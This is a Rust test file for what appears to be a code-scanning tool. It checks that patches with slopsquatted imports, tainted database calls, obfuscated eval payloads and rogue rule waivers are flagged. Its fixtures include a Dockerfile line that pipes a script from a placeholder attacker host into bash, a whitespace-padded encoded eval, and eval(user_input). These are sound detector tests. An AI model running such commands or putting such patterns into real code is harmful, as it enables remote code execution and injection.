            .bounce(patch, &common::registry::SymbolRegistry::default())
            .unwrap();

        assert!(
            !score
                .antipattern_details
                .iter()
                .any(|d| d.contains("security:slopsquat_injection")),
            "Crucible: safe JavaScript import must not trigger slopsquat detection"
        );
    }

    #[test]
    fn slopsquat_rust_fixture_intercepted() {
        let dir = tempfile::tempdir().unwrap();
        let janitor_dir = dir.path().join(".janitor");
        fs::create_dir_all(&janitor_dir).unwrap();

        write_slopsquat_fixture(
            &janitor_dir,
            &[
                "py-react-vsc",
                "django-tailwind-fast",
                "django-tailwind-fast",
            ],
        );

        let patch = "diff --git a/src/lib.rs b/src/lib.rs\n\
                     index 0000000..1111111 100644\n\
                     --- a/src/lib.rs\n\
                     +++ b/src/lib.rs\n\
                     @@ -0,0 +1,2 @@\n\
                     +extern crate django_tailwind_fast;\n\
                     +pub fn marker() {}\n";

        let score = forge::slop_filter::PatchBouncer::for_workspace(dir.path())
            .bounce(patch, &common::registry::SymbolRegistry::default())
            .unwrap();

        assert!(
            score
                .antipattern_details
                .iter()
                .any(|d| d.contains("security:slopsquat_injection")),
            "Crucible: Rust slopsquat fixture was not surfaced in antipattern details"
        );
        assert!(
            score.antipattern_score >= 150,
            "Crucible: Rust slopsquat fixture must contribute at least 150 points"
        );
    }

    #[test]
    fn slopsquat_rust_fixture_safe() {
        let dir = tempfile::tempdir().unwrap();
        let janitor_dir = dir.path().join(".janitor");
        fs::create_dir_all(&janitor_dir).unwrap();

        write_slopsquat_fixture(
            &janitor_dir,
            &[
                "py-react-vsc",
                "django-tailwind-fast",
                "node-express-secure-template",
            ],
        );

        let patch = "diff --git a/src/lib.rs b/src/lib.rs\n\
                     index 0000000..1111111 100644\n\
                     --- a/src/lib.rs\n\
                     +++ b/src/lib.rs\n\
                     @@ -0,0 +1,2 @@\n\
                     +use serde::Serialize;\n\
                     +pub fn marker() {}\n";

        let score = forge::slop_filter::PatchBouncer::for_workspace(dir.path())
            .bounce(patch, &common::registry::SymbolRegistry::default())
            .unwrap();

        assert!(
            !score
                .antipattern_details
                .iter()
                .any(|d| d.contains("security:slopsquat_injection")),
            "Crucible: safe Rust import must not trigger slopsquat detection"
        );
    }

    // ── P0-1 Phase 3: Cross-File Taint Spine — Crucible fixtures ────────────

    /// True-positive: Python diff calls a cataloged sink helper with a non-literal arg.
    /// Expects `security:cross_file_taint_sink` at KevCritical (+150 pts).
    #[test]
    fn cross_file_taint_python_intercepted() {
        use common::taint::{TaintExportRecord, TaintKind, TaintedParam};

        let dir = tempfile::tempdir().unwrap();
        let janitor_dir = dir.path().join(".janitor");
        fs::create_dir_all(&janitor_dir).unwrap();

        // Catalog entry: `build_query` propagates UserInput taint to DatabaseResult sink.
        let records = vec![TaintExportRecord {
            symbol_name: "build_query".to_string(),
            file_path: "helpers/db.py".to_string(),
            tainted_params: vec![TaintedParam {
                param_index: 0,
                param_name: "user_id".to_string(),
                kind: TaintKind::UserInput,
            }],
            sink_kinds: vec![TaintKind::DatabaseResult],
            propagates_to_return: true,
        }];
        forge::taint_catalog::write_catalog(&janitor_dir.join("taint_catalog.rkyv"), &records)
            .unwrap();

        // Diff: app.py calls build_query(request_param) — tainted argument.
        let patch = "diff --git a/app.py b/app.py\n\
                     index 0000000..1111111 100644\n\
                     --- a/app.py\n\
                     +++ b/app.py\n\
                     @@ -0,0 +1,4 @@\n\
                     +def handle(request):\n\
                     +    user_id = request.args[\"uid\"]\n\
                     +    result = db.execute(build_query(user_id))\n\
                     +    return result\n";

        let score = forge::slop_filter::PatchBouncer::for_workspace(dir.path())
            .bounce(patch, &common::registry::SymbolRegistry::default())
            .unwrap();

        assert!(
            score
                .antipattern_details
                .iter()
                .any(|d| d.contains("cross_file_taint_sink")),
            "Crucible: cross_file_taint_sink must fire when cataloged sink helper is called with tainted arg"
        );
        assert!(
            score.antipattern_score >= 150,
            "Crucible: cross_file_taint_sink must contribute KevCritical points"
        );
    }

    /// True-positive: TypeScript diff calls a cataloged sink helper with a non-literal arg.
    /// Expects `security:cross_file_taint_sink` at KevCritical (+150 pts).
    #[test]
    fn cross_file_taint_typescript_intercepted() {
        use common::taint::{TaintExportRecord, TaintKind, TaintedParam};

        let dir = tempfile::tempdir().unwrap();
        let janitor_dir = dir.path().join(".janitor");
        fs::create_dir_all(&janitor_dir).unwrap();

        // Catalog: `buildQuery` carries UserInput taint to a DatabaseResult sink.
        let records = vec![TaintExportRecord {
            symbol_name: "buildQuery".to_string(),
            file_path: "helpers/db.ts".to_string(),
            tainted_params: vec![TaintedParam {
                param_index: 0,
                param_name: "userId".to_string(),
                kind: TaintKind::UserInput,
            }],
            sink_kinds: vec![TaintKind::DatabaseResult],
            propagates_to_return: true,
        }];
        forge::taint_catalog::write_catalog(&janitor_dir.join("taint_catalog.rkyv"), &records)
            .unwrap();

        // Diff: api.ts calls buildQuery(req.userId) — tainted argument.
        let patch = "diff --git a/api.ts b/api.ts\n\
                     index 0000000..1111111 100644\n\
                     --- a/api.ts\n\
                     +++ b/api.ts\n\
                     @@ -0,0 +1,4 @@\n\
                     +function handle(req: Request) {\n\
                     +    const userId = req.query[\"uid\"];\n\
                     +    const result = db.execute(buildQuery(userId));\n\
                     +    return result;\n\
                     +}\n";

        let score = forge::slop_filter::PatchBouncer::for_workspace(dir.path())
            .bounce(patch, &common::registry::SymbolRegistry::default())
            .unwrap();

        assert!(
            score
                .antipattern_details
                .iter()
                .any(|d| d.contains("cross_file_taint_sink")),
            "Crucible: TypeScript cross_file_taint_sink must fire on cataloged sink with tainted arg"
        );
        assert!(
            score.antipattern_score >= 150,
            "Crucible: TypeScript cross_file_taint_sink must contribute KevCritical points"
        );
    }

    /// True-negative: TypeScript diff calls a function NOT in the catalog — must be silent.
    #[test]
    fn cross_file_taint_typescript_safe() {
        use common::taint::{TaintExportRecord, TaintKind};

        let dir = tempfile::tempdir().unwrap();
        let janitor_dir = dir.path().join(".janitor");
        fs::create_dir_all(&janitor_dir).unwrap();

        let records = vec![TaintExportRecord {
            symbol_name: "anotherHelper".to_string(),
            file_path: "helpers.ts".to_string(),
            tainted_params: vec![],
            sink_kinds: vec![TaintKind::DatabaseResult],
            propagates_to_return: false,
        }];
        forge::taint_catalog::write_catalog(&janitor_dir.join("taint_catalog.rkyv"), &records)
            .unwrap();

        let patch = "diff --git a/api.ts b/api.ts\n\
                     index 0000000..1111111 100644\n\
                     --- a/api.ts\n\
                     +++ b/api.ts\n\
                     @@ -0,0 +1,3 @@\n\
                     +function process(data: string) {\n\
                     +    return safeTransform(data);\n\
                     +}\n";

        let score = forge::slop_filter::PatchBouncer::for_workspace(dir.path())
            .bounce(patch, &common::registry::SymbolRegistry::default())
            .unwrap();

        assert!(
            !score
                .antipattern_details
                .iter()
                .any(|d| d.contains("cross_file_taint_sink")),
            "Crucible: TypeScript cross_file_taint_sink must not fire for uncataloged function"
        );
    }

    /// True-positive: Go diff calls a cataloged sink helper (bare identifier) with tainted arg.
    /// Expects `security:cross_file_taint_sink` at KevCritical (+150 pts).
    #[test]
    fn cross_file_taint_go_intercepted() {
        use common::taint::{TaintExportRecord, TaintKind, TaintedParam};

        let dir = tempfile::tempdir().unwrap();
        let janitor_dir = dir.path().join(".janitor");
        fs::create_dir_all(&janitor_dir).unwrap();

        // Catalog: `buildQuery` carries UserInput taint to a DatabaseResult sink.
        let records = vec![TaintExportRecord {
            symbol_name: "buildQuery".to_string(),
            file_path: "helpers/db.go".to_string(),
            tainted_params: vec![TaintedParam {
                param_index: 0,
                param_name: "userID".to_string(),
                kind: TaintKind::UserInput,
            }],
            sink_kinds: vec![TaintKind::DatabaseResult],
            propagates_to_return: true,
        }];
        forge::taint_catalog::write_catalog(&janitor_dir.join("taint_catalog.rkyv"), &records)
            .unwrap();

        // Diff: handler.go calls db.Exec(buildQuery(userID)) — tainted argument.
        let patch = "diff --git a/handler.go b/handler.go\n\
                     index 0000000..1111111 100644\n\
                     --- a/handler.go\n\
                     +++ b/handler.go\n\
                     @@ -0,0 +1,6 @@\n\
                     +package main\n\
                     +func Handle(db *sql.DB, userID string) {\n\
                     +    row, _ := db.Query(buildQuery(userID))\n\
                     +    _ = row\n\
                     +}\n";

        let score = forge::slop_filter::PatchBouncer::for_workspace(dir.path())
            .bounce(patch, &common::registry::SymbolRegistry::default())
            .unwrap();

        assert!(
            score
                .antipattern_details
                .iter()
                .any(|d| d.contains("cross_file_taint_sink")),
            "Crucible: Go cross_file_taint_sink must fire on cataloged bare-identifier sink"
        );
        assert!(
            score.antipattern_score >= 150,
            "Crucible: Go cross_file_taint_sink must contribute KevCritical points"
        );
    }

    /// True-negative: Go diff calls a function NOT in the catalog — must be silent.
    #[test]
    fn cross_file_taint_go_safe() {
        use common::taint::{TaintExportRecord, TaintKind};

        let dir = tempfile::tempdir().unwrap();
        let janitor_dir = dir.path().join(".janitor");
        fs::create_dir_all(&janitor_dir).unwrap();

        let records = vec![TaintExportRecord {
            symbol_name: "dangerousHelper".to_string(),
            file_path: "helpers.go".to_string(),
            tainted_params: vec![],
            sink_kinds: vec![TaintKind::DatabaseResult],
            propagates_to_return: false,
        }];
        forge::taint_catalog::write_catalog(&janitor_dir.join("taint_catalog.rkyv"), &records)
            .unwrap();

        let patch = "diff --git a/handler.go b/handler.go\n\
                     index 0000000..1111111 100644\n\
                     --- a/handler.go\n\
                     +++ b/handler.go\n\
                     @@ -0,0 +1,5 @@\n\
                     +package main\n\
                     +func Process(x string) {\n\
                     +    safeTransform(x)\n\
                     +}\n";

        let score = forge::slop_filter::PatchBouncer::for_workspace(dir.path())
            .bounce(patch, &common::registry::SymbolRegistry::default())
            .unwrap();

        assert!(
            !score
                .antipattern_details
                .iter()
                .any(|d| d.contains("cross_file_taint_sink")),
            "Crucible: Go cross_file_taint_sink must not fire for uncataloged function"
        );
    }

    /// True-negative: Python diff calls a function NOT in the catalog — must be silent.
    #[test]
    fn cross_file_taint_python_safe() {
        use common::taint::{TaintExportRecord, TaintKind};

        let dir = tempfile::tempdir().unwrap();
        let janitor_dir = dir.path().join(".janitor");
        fs::create_dir_all(&janitor_dir).unwrap();

        // Catalog only contains `other_helper`, not `safe_transform`.
        let records = vec![TaintExportRecord {
            symbol_name: "other_helper".to_string(),
            file_path: "helpers.py".to_string(),
            tainted_params: vec![],
            sink_kinds: vec![TaintKind::DatabaseResult],
            propagates_to_return: false,
        }];
        forge::taint_catalog::write_catalog(&janitor_dir.join("taint_catalog.rkyv"), &records)
            .unwrap();

        // Diff: calls safe_transform — not in catalog, must not fire.
        let patch = "diff --git a/app.py b/app.py\n\
                     index 0000000..1111111 100644\n\
                     --- a/app.py\n\
                     +++ b/app.py\n\
                     @@ -0,0 +1,3 @@\n\
                     +def process(data):\n\
                     +    return safe_transform(data)\n";

        let score = forge::slop_filter::PatchBouncer::for_workspace(dir.path())
            .bounce(patch, &common::registry::SymbolRegistry::default())
            .unwrap();

        assert!(
            !score
                .antipattern_details
                .iter()
                .any(|d| d.contains("cross_file_taint_sink")),
            "Crucible: cross_file_taint_sink must not fire for a function absent from the catalog"
        );
    }

    #[test]
    fn semantic_cst_diff_whitespace_padded_payload_intercepted() {
        let patch = "diff --git a/app.js b/app.js\n\
                     index 0000000..1111111 100644\n\
                     --- a/app.js\n\
                     +++ b/app.js\n\
                     @@ -0,0 +1,24 @@\n\
                     +function padded() {\n\
                     +\n\
                     +\n\
                     +\n\
                     +\n\
                     +\n\
                     +\n\
                     +\n\
                     +\n\
                     +\n\
                     +\n\
                     +  eval((\"Y29uc2\" + \"9sZS5\" + \"sb2co\" + \"J2hhY2tlZCcp\"));\n\
                     +\n\
                     +\n\
                     +\n\
                     +\n\
                     +\n\
                     +\n\
                     +\n\
                     +\n\
                     +\n\
                     +\n\
                     +}\n";

        let score = forge::slop_filter::PatchBouncer::default()
            .bounce(patch, &common::registry::SymbolRegistry::default())
            .unwrap();

        assert!(
            score
                .antipattern_details
                .iter()
                .any(|d| d.contains("security:obfuscated_payload_execution")),
            "Crucible: CST diff must isolate the padded malicious subtree and surface obfuscated payload execution"
        );
    }

    #[test]
    fn dockerfile_surface_router_intercepts_extensionless_patch() {
        let patch = "diff --git a/Dockerfile b/Dockerfile\n\
                     index 0000000..1111111 100644\n\
                     --- a/Dockerfile\n\
                     +++ b/Dockerfile\n\
                     @@ -0,0 +1,2 @@\n\
                     +FROM alpine:3.20\n\
                     +RUN curl -fsSL https://evil.example/install.sh | bash\n";

        let score = forge::slop_filter::PatchBouncer::default()
            .bounce(patch, &common::registry::SymbolRegistry::default())
            .unwrap();

        assert!(
            score
                .antipattern_details
                .iter()
                .any(|d| d.contains("security:dockerfile_pipe_execution")),
            "Crucible: SurfaceKind routing must dispatch Dockerfile patches to the detector engine"
        );
        assert!(
            score.score() >= 50,
            "Crucible: extensionless Dockerfile routing must preserve critical scoring"
        );
    }

    // ---------------------------------------------------------------------------
    // Exhaustion corpus regression — parser hardening against algorithmic bombs
    // ---------------------------------------------------------------------------

    /// Dynamic corpus loader: reads every file under
    /// `crates/crucible/fixtures/exhaustion/` and asserts that feeding each
    /// artifact to `find_slop` neither panics nor exceeds the 500 ms parse
    /// budget hard-coded in `PARSER_TIMEOUT_MICROS`.
    ///
    /// Promoted artifacts land here via `tools/promote_fuzz_corpus.sh`.  The
    /// test exercises the parse-with-timeout path so any algorithmic-complexity
    /// regression surfaces immediately in `just audit` rather than requiring a
    /// live fuzzer run.
    #[test]
    fn exhaustion_corpus_no_panic() {
        use std::time::{Duration, Instant};

        let fixture_dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("fixtures")
            .join("exhaustion");

        let entries: Vec<_> = std::fs::read_dir(&fixture_dir)
            .expect("fixtures/exhaustion/ must exist")
            .filter_map(|e| e.ok())
            .filter(|e| e.path().is_file())
            .filter(|e| {
                e.path()
                    .file_name()
                    .and_then(|n| n.to_str())
                    .map(|n| n != ".gitkeep")
                    .unwrap_or(false)
            })
            .collect();

        // The directory must contain at least the seed fixture added in v9.9.17.
        assert!(
            !entries.is_empty(),
            "exhaustion corpus must contain at least one fixture"
        );

        let budget = Duration::from_millis(500);

        for entry in &entries {
            let path = entry.path();
            let bytes = std::fs::read(&path).expect("fixture must be readable");

            // Try the artifact as each major language the AST router handles.
            for lang in &["rs", "py", "js", "ts", "go", "rb"] {
                let start = Instant::now();
                // ParsedUnit::unparsed hands raw bytes to the detector without
                // pre-parsing; the exhaustion detectors request a parse on demand,
                // exercising the timeout path.  find_slop must not panic regardless
                // of input content.
                let parsed = forge::slop_hunter::ParsedUnit::unparsed(&bytes);
                let _ = find_slop(lang, &parsed);
                let elapsed = start.elapsed();

                assert!(
                    elapsed < budget,
                    "parser exceeded 500 ms budget on exhaustion fixture"
                );
            }
        }
    }

    // ---------------------------------------------------------------------------
    // Wasm host-guest round-trip — proves BYOP sandbox is functional end-to-end
    // ---------------------------------------------------------------------------

    /// Loads the `mock_rule.wat` fixture via [`forge::wasm_host::WasmHost`],
    /// executes it against synthetic source bytes, and asserts the full
    /// host-guest pipeline: engine compilation → memory I/O → fuel enforcement →
    /// JSON deserialisation → `StructuredFinding` round-trip.
    ///
    /// This test is the only authoritative proof that the Wasm sandbox compiles,
    /// instantiates, and returns structured findings correctly.  Any regression
    /// in the ABI (missing export, bad fuel config, malformed JSON) will surface
    /// here before it reaches a customer environment.
    #[test]
    fn wasm_host_loop_roundtrip() {
        let fixture = concat!(env!("CARGO_MANIFEST_DIR"), "/fixtures/mock_rule.wat");
        let host = forge::wasm_host::WasmHost::new(&[fixture], &std::collections::HashMap::new())
            .expect("mock_rule.wat must compile without error");

        // Execute against non-trivial source bytes to exercise the src write path.
        let findings = host.run(b"fn main() { println!(\"hello\"); }");

        assert_eq!(
            findings.findings.len(),
            1,
            "Wasm mock rule must emit exactly one finding"
        );
        assert_eq!(
            findings.findings[0].id, "security:proprietary_rule",
            "finding id must match the mock fixture's static output"
        );
        assert_eq!(
            findings.findings[0].file, None,
            "mock fixture must emit null file field"
        );
        assert_eq!(
            findings.findings[0].line, None,
            "mock fixture must emit null line field"
        );
        assert_eq!(
            findings.receipts.len(),
            1,
            "Wasm mock rule must emit exactly one provenance receipt"
        );

        // Verify empty source returns no findings (short-circuit guard).
        let empty_findings = host.run(b"");
        assert!(
            empty_findings.findings.is_empty() && empty_findings.receipts.is_empty(),
            "empty source must yield no Wasm findings"
        );
    }

    // ---------------------------------------------------------------------------
    // CT-015: Wasm epoch wall-clock timeout — proves the 100 ms gate fires
    // ---------------------------------------------------------------------------

    /// Confirms that a tight-loop Wasm module is terminated within the wall-clock
    /// budget even if it remains within the fuel allocation.
    ///
    /// The infinite-loop WAT below is killed by either fuel exhaustion or the
    /// epoch timeout (whichever fires first).  The critical invariant is that
    /// `host.run()` returns in bounded time and yields no findings — the engine
    /// never hangs waiting for a runaway guest.
    ///
    /// This is the CT-015 regression gate: any removal of epoch_interruption or
    /// the timeout thread in `wasm_host.rs` will cause this test to hang under
    /// adversarial guest modules that allocate near the memory ceiling without
    /// consuming fuel rapidly.
    #[test]
    fn wasm_host_epoch_timeout_enforced() {
        use std::time::{Duration, Instant};

        let infinite_wat = r#"(module
  (memory (export "memory") 1)
  (func (export "output_ptr") (result i32) i32.const 0)
  (func (export "analyze") (param i32 i32) (result i32)
    (loop $l (br $l))
    i32.const 0
  )
)"#;

        let mut tmp = tempfile::NamedTempFile::with_suffix(".wat").unwrap();
        use std::io::Write as _;
        tmp.write_all(infinite_wat.as_bytes()).unwrap();
        let path = tmp.path().to_str().unwrap().to_owned();
        let tmp_path = tmp.into_temp_path();

        let host = forge::wasm_host::WasmHost::new(&[&path], &std::collections::HashMap::new())
            .expect("infinite-loop WAT must compile");

        let start = Instant::now();
        let result = host.run(b"fn main() {}");
        let elapsed = start.elapsed();

        drop(tmp_path);

        // The combination of fuel gate + epoch timeout must terminate within 2 s.
        // Under Cranelift JIT the fuel gate fires in < 500 ms; the epoch gate
        // provides the backstop for memory-pressure scenarios that survive fuel.
        assert!(
            elapsed < Duration::from_secs(2),
            "Wasm host must terminate infinite-loop module within 2 s wall-clock budget"
        );
        assert!(
            result.findings.is_empty(),
            "terminated module must yield no findings"
        );
        assert!(
            result.receipts.is_empty(),
            "terminated module must yield no receipts"
        );
    }

    #[test]
    fn unauthorized_suppression_attempt_is_intercepted() {
        let patch = "\
diff --git a/app.py b/app.py
--- a/app.py
+++ b/app.py
@@ -0,0 +1,2 @@
+def inject(user_input):
+    eval(user_input)
";
        let registry = common::registry::SymbolRegistry::default();

        let unsuppressed = forge::slop_filter::PatchBouncer::default()
            .bounce(patch, &registry)
            .expect("baseline patch must analyze");
        assert!(
            unsuppressed.score() > 0,
            "baseline patch must produce a non-zero score before waiver"
        );

        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("janitor.toml"),
            r#"
[[suppressions]]
id = "waive-eval"
rule = "security:dynamic_eval"
path_glob = "app.py"
expires = "4102444800"
owner = "appsec"
reason = "temporary waiver"
"#,
        )
        .unwrap();

        let waived = forge::slop_filter::PatchBouncer::for_workspace(dir.path())
            .bounce(patch, &registry)
            .expect("suppressed patch must analyze");
        assert!(
            waived
                .structured_findings
                .iter()
                .any(|finding| finding.id.contains("security:dynamic_eval")),
            "unapproved waiver must retain the original finding"
        );
        assert!(
            waived
                .structured_findings
                .iter()
                .any(|finding| finding.id.contains("security:unauthorized_suppression")),
            "rogue waiver attempt must be surfaced as a structured critical finding"
        );
        assert!(
            waived.score() >= forge::slop_hunter::Severity::KevCritical.points(),
            "rogue waiver attempt must contribute the critical suppression score"
        );
    }

    // ---------------------------------------------------------------------------
    // CT-014: member-expression call chain detection — Crucible fixtures
    // ---------------------------------------------------------------------------

    /// CT-014 true positive (JS): `obj.dangerousSink(userInput)` — member_expression
    /// callee must be intercepted as a cross-file taint sink.
    #[test]
    fn cross_file_taint_js_member_expression_intercepted() {
        use common::taint::{TaintExportRecord, TaintKind, TaintedParam};

        let dir = tempfile::tempdir().unwrap();
        let janitor_dir = dir.path().join(".janitor");
        fs::create_dir_all(&janitor_dir).unwrap();

        let records = vec![TaintExportRecord {
            symbol_name: "dangerousSink".to_string(),
            file_path: "helpers.js".to_string(),
            tainted_params: vec![TaintedParam {
                param_index: 0,
                param_name: "input".to_string(),
                kind: TaintKind::UserInput,
            }],
            sink_kinds: vec![TaintKind::DatabaseResult],
            propagates_to_return: true,
        }];
        forge::taint_catalog::write_catalog(&janitor_dir.join("taint_catalog.rkyv"), &records)
            .unwrap();

        // Diff: api.js calls obj.dangerousSink(userInput) — member-expression callee.
        let patch = "diff --git a/api.js b/api.js\n\
                     index 0000000..1111111 100644\n\
                     --- a/api.js\n\
                     +++ b/api.js\n\
                     @@ -0,0 +1,3 @@\n\
                     +function handle(req) {\n\
                     +    obj.dangerousSink(req.body);\n\
                     +}\n";

        let score = forge::slop_filter::PatchBouncer::for_workspace(dir.path())
            .bounce(patch, &common::registry::SymbolRegistry::default())
            .unwrap();

        assert!(
            score
                .antipattern_details
                .iter()
                .any(|d| d.contains("cross_file_taint_sink")),
            "Crucible: JS member_expression cross_file_taint_sink must fire on obj.dangerousSink(tainted)"
        );
        assert!(
            score.antipattern_score >= 150,
            "Crucible: JS member_expression cross_file_taint_sink must contribute KevCritical points"
        );
    }

    /// CT-014 true positive (Python): `self.db_helper(user_input)` — attribute callee
    /// must be intercepted as a cross-file taint sink.
    #[test]
    fn cross_file_taint_python_attribute_callee_intercepted() {
        use common::taint::{TaintExportRecord, TaintKind, TaintedParam};

        let dir = tempfile::tempdir().unwrap();
        let janitor_dir = dir.path().join(".janitor");
        fs::create_dir_all(&janitor_dir).unwrap();

        let records = vec![TaintExportRecord {
            symbol_name: "db_helper".to_string(),
            file_path: "helpers.py".to_string(),
            tainted_params: vec![TaintedParam {
                param_index: 0,
                param_name: "user_input".to_string(),
                kind: TaintKind::UserInput,
            }],
            sink_kinds: vec![TaintKind::DatabaseResult],
            propagates_to_return: true,
        }];
        forge::taint_catalog::write_catalog(&janitor_dir.join("taint_catalog.rkyv"), &records)
            .unwrap();

        // Diff: service.py calls self.db_helper(user_input) — attribute callee.
        let patch = "diff --git a/service.py b/service.py\n\
                     index 0000000..1111111 100644\n\
                     --- a/service.py\n\
                     +++ b/service.py\n\
                     @@ -0,0 +1,3 @@\n\
                     +def process(self, user_input):\n\
                     +    return self.db_helper(user_input)\n";

        let score = forge::slop_filter::PatchBouncer::for_workspace(dir.path())
            .bounce(patch, &common::registry::SymbolRegistry::default())
            .unwrap();

        assert!(
            score
                .antipattern_details
                .iter()
                .any(|d| d.contains("cross_file_taint_sink")),
            "Crucible: Python attribute callee cross_file_taint_sink must fire on self.db_helper(user_input)"
        );
        assert!(
            score.antipattern_score >= 150,
            "Crucible: Python attribute callee cross_file_taint_sink must contribute KevCritical points"
        );
    }

    /// CT-014 true positive (TS): `this.queryRunner(payload)` — member_expression callee
    /// must be intercepted as a cross-file taint sink.
    #[test]
    fn cross_file_taint_ts_member_expression_intercepted() {
        use common::taint::{TaintExportRecord, TaintKind, TaintedParam};

        let dir = tempfile::tempdir().unwrap();
        let janitor_dir = dir.path().join(".janitor");
        fs::create_dir_all(&janitor_dir).unwrap();

        let records = vec![TaintExportRecord {
            symbol_name: "queryRunner".to_string(),
            file_path: "db.ts".to_string(),
            tainted_params: vec![TaintedParam {
                param_index: 0,
                param_name: "payload".to_string(),
                kind: TaintKind::UserInput,
            }],
            sink_kinds: vec![TaintKind::DatabaseResult],
            propagates_to_return: true,
        }];
        forge::taint_catalog::write_catalog(&janitor_dir.join("taint_catalog.rkyv"), &records)
            .unwrap();

        // Diff: api.ts calls this.queryRunner(payload) — member-expression callee.
        let patch = "diff --git a/api.ts b/api.ts\n\
                     index 0000000..1111111 100644\n\
                     --- a/api.ts\n\
                     +++ b/api.ts\n\
                     @@ -0,0 +1,3 @@\n\
                     +async function handle(payload: string) {\n\
                     +    await this.queryRunner(payload);\n\
                     +}\n";

        let score = forge::slop_filter::PatchBouncer::for_workspace(dir.path())
            .bounce(patch, &common::registry::SymbolRegistry::default())
            .unwrap();

        assert!(
            score
                .antipattern_details
                .iter()
                .any(|d| d.contains("cross_file_taint_sink")),
            "Crucible: TS member_expression cross_file_taint_sink must fire on this.queryRunner(payload)"
        );
        assert!(
            score.antipattern_score >= 150,
            "Crucible: TS member_expression cross_file_taint_sink must contribute KevCritical points"
        );
    }

    /// CT-016 true-negative: UTF-16 LE BOM source file must NOT be flagged as
    /// AnomalousBlob.  Without the BOM guard, the null bytes from wide-char
    /// encoding trigger the binary-content path — a false positive that blocks
    /// legitimate Windows-adjacent source files.
    #[test]
    fn utf16_bom_source_not_flagged_as_anomalous_blob() {
        use forge::agnostic_shield::{ByteLatticeAnalyzer, TextClass};

        // UTF-16 LE BOM (FF FE) + "int main() {}" in UTF-16 LE encoding.
        // Each ASCII byte is followed by 0x00; without the BOM guard these
        // null bytes would classify the payload as AnomalousBlob.
        let mut utf16_le: Vec<u8> = vec![0xFF, 0xFE];
        for c in b"int main() {}" {
            utf16_le.push(*c);
            utf16_le.push(0x00);
        }

        assert_eq!(
            ByteLatticeAnalyzer::classify(&utf16_le),
            TextClass::ProbableCode,
            "Crucible: UTF-16 LE BOM source file must not be flagged as AnomalousBlob (CT-016)"
        );
    }
}
